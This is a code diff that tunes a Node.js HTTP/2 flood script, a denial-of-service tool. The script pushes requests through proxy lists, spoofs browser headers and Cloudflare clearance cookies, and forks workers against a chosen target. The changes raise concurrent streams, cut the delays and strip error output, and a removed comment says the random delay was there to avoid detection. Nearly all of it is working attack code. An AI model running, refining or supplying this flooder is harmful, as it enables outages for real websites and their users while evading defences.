@@ -16,15 +16,9 @@ if (process.argv.length < 7) {
 }
 
 function readLines(filePath) {
-    if (!fs.existsSync(filePath)) {
-        console.log("Proxy file not found!");
-        process.exit(1);
-    }
+    if (!fs.existsSync(filePath)) process.exit(1);
     const lines = fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim());
-    if (!lines.length) {
-        console.log("Proxy file is empty!");
-        process.exit(1);
-    }
+    if (!lines.length) process.exit(1);
     return lines;
 }
 
@@ -54,10 +48,7 @@ const args = {
 };
 
 const parsedTarget = url.parse(args.target);
-if (!parsedTarget.protocol || !parsedTarget.host) {
-    console.log("Invalid target URL!");
-    process.exit(1);
-}
+if (!parsedTarget.protocol || !parsedTarget.host) process.exit(1);
 
 const userAgents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
@@ -120,17 +111,13 @@ const ciphers = [
 const proxies = readLines(args.proxyFile);
 
 if (cluster.isMaster) {
-    for (let counter = 1; counter <= args.threads; counter++) {
-        cluster.fork();
-    }
+    for (let counter = 1; counter <= args.threads; counter++) cluster.fork();
     setTimeout(() => process.exit(0), args.time * 1000);
 } else {
     setInterval(runFlooder, 0);
 }
 
 class NetSocket {
-    constructor() {}
-
     async HTTP(options) {
         return new Promise((resolve, reject) => {
             const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
@@ -140,28 +127,21 @@ class NetSocket {
                 port: options.port,
                 noDelay: true
             });
-
             connection.setTimeout(options.timeout * 1000);
             connection.setKeepAlive(true, 60000);
-
-            connection.on("connect", () => {
-                connection.write(buffer);
-            });
-
+            connection.on("connect", () => connection.write(buffer));
             connection.on("data", chunk => {
                 const response = chunk.toString("utf-8");
                 if (!response.includes("HTTP/1.1 200")) {
                     connection.destroy();
                     return reject("invalid proxy response");
                 }
-                return resolve(connection);
+                resolve(connection);
             });
-
             connection.on("timeout", () => {
                 connection.destroy();
                 reject("timeout");
             });
-
             connection.on("error", () => {
                 connection.destroy();
                 reject("error");
@@ -188,7 +168,7 @@ function generateDynamicPath() {
 
 function generateDynamicHeaders() {
     const uaIndex = randomIntn(0, userAgents.length);
-    const headers = {
+    return {
         ":method": "GET",
         ":authority": parsedTarget.host,
         ":path": generateDynamicPath(),
@@ -213,7 +193,6 @@ function generateDynamicHeaders() {
         "sec-ch-viewport-width": randomIntn(800, 1920).toString(),
         "cookie": `__cfduid=${randstr(32)}; cf_clearance=${randstr(40)}; session=${randstr(16)}`
     };
-    return headers;
 }
 
 async function checkProxy(proxyAddr) {
@@ -243,14 +222,13 @@ async function runFlooder() {
     const proxyOptions = {
         host: parsedProxy[0],
         port: parseInt(parsedProxy[1]),
-        address: parsedProxyOptions.host + ":443",
+        address: parsedTarget.host + ":443",
         timeout: 10
     };
 
     try {
-        const connection = await fetcher.HTTP(proxyOptions);
+        const connection = await Socker.HTTP(proxyOptions);
         const tlsOptions = {
-            secure: true,
             ALPNProtocols: ['h2'],
             ciphers: ciphers,
             host: parsedTarget.host,
@@ -270,7 +248,7 @@ async function runFlooder() {
             protocol: "https:",
             settings: {
                 headerTableSize: 65536,
-                maxConcurrentStreams: 200,
+                maxConcurrentStreams: 1000,
                 initialWindowSize: 10485760,
                 maxHeaderListSize: 262144
             },
@@ -282,17 +260,12 @@ async function runFlooder() {
                 const dynHeaders = generateDynamicHeaders();
                 for (let i = 0; i < args.rate; i++) {
                     const request = client.request(dynHeaders, { timeout: 500 });
-                    request.on("response", () => {
-                        request.close(http2.constants.NGHTTP2_NO_ERROR);
-                    });
-                    request.on("error", () => {
-                        request.close(http2.constants.NGHTTP2_CANCEL);
-                    });
+                    request.on("response", () => request.close(http2.constants.NGHTTP2_NO_ERROR));
+                    request.on("error", () => request.close(http2.constants.NGHTTP2_CANCEL));
                     request.end();
-                });
-                // Random delay để tránh detection
-                await new Promise(r => setTimeout(r, randomIntn(50, 150)));
-            }, 1);
+                }
+                await new Promise(r => setTimeout(r, randomIntn(10, 50)));
+            }, 0);
 
             setTimeout(() => {
                 clearInterval(intervalAttack);
@@ -313,7 +286,7 @@ async function runFlooder() {
             tlsConn.destroy();
             connection.destroy();
         });
-    } catch (error) {
-        setTimeout(runFlooder, 1000);
+    } catch {
+        setTimeout(runFlooder, 500);
     }
 }
